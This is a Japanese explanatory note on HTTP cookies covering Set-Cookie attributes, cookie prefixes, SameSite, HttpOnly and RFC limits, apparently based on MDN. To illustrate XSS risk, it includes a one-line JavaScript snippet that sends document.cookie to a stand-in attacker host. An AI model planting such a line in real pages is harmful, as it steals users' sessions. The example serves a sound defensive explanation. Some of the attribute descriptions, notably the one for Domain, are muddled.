# 概要
Cookieについて

# 詳細

## Cookieについて
クライアント側にオフロードしていた情報をサーバ側に指定することができる仕組みです。
```
Cookie: A=aaaa; B=bbbb; C=cccc; D=dddd; E=eeee; 
```

Cookieは次のような場合に利用されます。
- セッション管理
- パーソナライズ
- トラッキング

## Set-Cookieについて
Set-Cookieはレスポンス時にクライアントに次回リクエスト時にCookieヘッダとして付与してほしい情報を応答します。
複数の値を同時に書き込むことはできないので、以下のように複数のSet-Cookieヘッダとしてレスポンスを応答することは問題ありません。
```
HTTP/2.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry
```

Cookieの値としては次のように２つの接頭辞で始まる場合も規定されています。
```
Set-Cookie: __Secure-hoge=fuga
Set-Cookie: __Host-hoge=fuga
```

- __Secure-:
  - secureフラグを設定することが必要で、HTTPSページでなければなりません。
- __Host-:
  - secureフラグを設定してHTTPSページから読み込む必要があり、domainが指定できないのでそのドメインしか送付できず、パスが"/"で終わる必要があります。


### セッションCookie
Set-Cookieでのレスポンス時にexpiresやmax-ageを指定していない場合はセッションCookieです。
ブラウザを閉じるとその時点でCookie情報は消去されます。次の設定はセッションCookieです。
```
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry
```

### 長期間持続Cookie
```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

### スコープ制限(Domain)
Cookieを送付しても良いDomainを指定します。
注意点としてこの属性が指定されていない場合には、そのドメインに対してCookieを送ることを意味していて、サブドメインの場合にはCookieは送付されません。
```
Set-Cookie: id=a3fWa; Domain=example.com
```

上記の例だとexample.comやxxx.example.comといったドメインでもCookie情報が送付されることになります。


### スコープ制限(Path)
このパスは絶対パスである必要があります。
```
Set-Cookie: id=a3fWa; Path=/docs
```

上記のパスの例だと次のようなURLの場合にCookie情報が送付されます。
- https://xxx.yyy.zz/docs/hoge

### スコープ制限(Secure)
この属性を付与することでhttpsの通信を使用しているときだけ、クッキーが送信されます。 
```
Set-Cookie: id=a3fWa; Secure
```

### スコープ制限(SameSite)
この属性は比較的新しい仕様です。
サーバ間にまたがったリクエストに対してCookieを送付するかどうかの主張を定義することで、CSRF攻撃を防御することができます。

- Strict, Lax, Noneの３種類があり、
```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; SameSite=Strict
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; SameSite=Lax
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; SameSite=None
```

- Strict
  - 通常のリンクを追う場合を含め、ブラウザーがすべてのサイト間閲覧コンテキストの対象サイト向けてクッキーを送信することを防ぎます。
- Lax
  - 最上位のナビゲーションでGETリクエストの場合のみ、クッキーを送信します。これはユーザーのトラッキングに効率的であるものの、多くのCSRF攻撃を防ぐことができます。
- None
  - 常にCookie情報が送付されます。例えば、第三者のサイトにxxx.co.jpの広告をiframe等で埋め込んだ際にも問題なくxxx.co.jpにxxx.co.jpが設定したCookie情報を送付することができます。

最近ではデフォルトNoneからLaxに挙動が変わるようにブラウザ側で提案されています。

### Javascript経由でCookieを生成する
以下のようにしてjavascript経由でもcookieを生成することが可能です。
```
document.cookie = "yummy_cookie=choco"; 
document.cookie = "tasty_cookie=strawberry"; 
console.log(document.cookie); 
```

JavaScriptで使用できるCookieは、次のようにXSSによって盗まれる可能性があります。
```
(new Image()).src = "http://www.evil-domain.com/steal-cookie?cookie=" + document.cookie;
```

javascriptでcookieの値にアクセスできなくするためにはSet-Cookie時にHttpOnly属性を付与することで回避できます。この属性はjavascript経由では設定できません。
```
Set-Cookie: yummy_cookie=choco; HttpOnly
Set-Cookie: tasty_cookie=strawberry; HttpOnly
```

## 制限
以下に制限が規定されています。
- https://tools.ietf.org/html/draft-ietf-httpbis-rfc6265bis-02#section-6

RFCで規定しているのは、
- cookie毎に少なくとも4096byte必要(name, value, attribte含む)
- ドメインごとに少なくとも50 cookie
- 最大のcookie数は3000

# 仕様書
- RFC
  - https://tools.ietf.org/html/rfc6265#section-4.1
  - https://tools.ietf.org/html/draft-ietf-httpbis-rfc6265bis-02

# 参考資料
- MDN web docs HTTP Cookie
  - https://developer.mozilla.org/ja/docs/Web/HTTP/Cookies


